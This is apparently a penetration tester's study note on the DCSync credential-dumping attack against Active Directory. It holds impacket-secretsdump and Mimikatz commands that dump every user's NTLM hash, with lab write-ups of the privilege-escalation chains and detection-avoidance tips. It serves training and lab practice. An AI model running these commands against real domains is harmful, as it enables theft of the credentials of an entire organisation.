# DCSync

**Requires**: Replicating Directory Changes + Replicating Directory Changes All permissions.

These are held by: Domain Admins, Enterprise Admins, or accounts with these ACLs granted (check [[BloodHound]]).

---

## From Linux

```bash
# Full domain dump
impacket-secretsdump domain.local/user:REDACTED
```

```bash
# Specific user only
impacket-secretsdump domain.local/user:REDACTED -just-dc-user administrator
```

```bash
# With NTLM hash instead of password
impacket-secretsdump domain.local/user@$DC -hashes :NTLM_HASH
```

---

## From Windows (Mimikatz)

```
mimikatz# lsadump::dcsync /domain:REDACTED /user:REDACTED
```

---

## Output

Gives NTLM hashes for all domain users. Use them for Pass the Hash.

→ [[Lateral-Movement]]

## From Your Boxes

> **Forest** (HTB) — DCSync after ACL abuse chain (Exchange Windows Permissions -> WriteDACL)
> - What worked: `impacket-secretsdump svc-alfresco@TARGET_IP`
> - First added user to Exchange Windows Permissions group, then granted DCSync rights via Add-DomainObjectAcl
> - Lesson: DCSync is often the final step after ACL abuse — the whole chain is: foothold -> ACL abuse -> grant DCSync -> dump hashes

> **Sauna** (HTB) — DCSync via Mimikatz and secretsdump after finding user with replication rights
> - What worked (Mimikatz): `.\mimikatz 'lsadump::dcsync /domain:REDACTED /user:REDACTED' exit`
> - What worked (remote): `impacket-secretsdump 'svc_loanmgr:REDACTED'`
> - Lesson: secretsdump from Kali is often easier than Mimikatz on target — same result, less detection risk

> **Vault** (PG) — DCSync after GPO abuse to add user to local admins
> - What worked: `impacket-secretsdump vault.offsec/anirudh:REDACTED`
> - Used SharpGPOAbuse to add user to admins first, then secretsdump worked
> - Lesson: You need domain admin or replication rights for DCSync — GPO abuse can get you there

> **Flight** (HTB) — DCSync via Rubeus ticket delegation + secretsdump with Kerberos auth
> - What worked: `sudo impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user administrator`
> - Had to fix time skew (`sudo ntpdate TARGET`) before Kerberos auth would work
> - Lesson: Kerberos-based secretsdump requires clock sync — always ntpdate the target first

> **Hokkaido** (PG) — secretsdump on SAM/SYSTEM hives after SeBackupPrivilege abuse
> - What worked: `impacket-secretsdump -system system -sam sam local`
> - Dumped SAM/SYSTEM via `reg save hklm\sam` and `reg save hklm\system` with SeBackupPrivilege
> - Lesson: If you cannot DCSync the domain, dump SAM+SYSTEM locally and run secretsdump on them
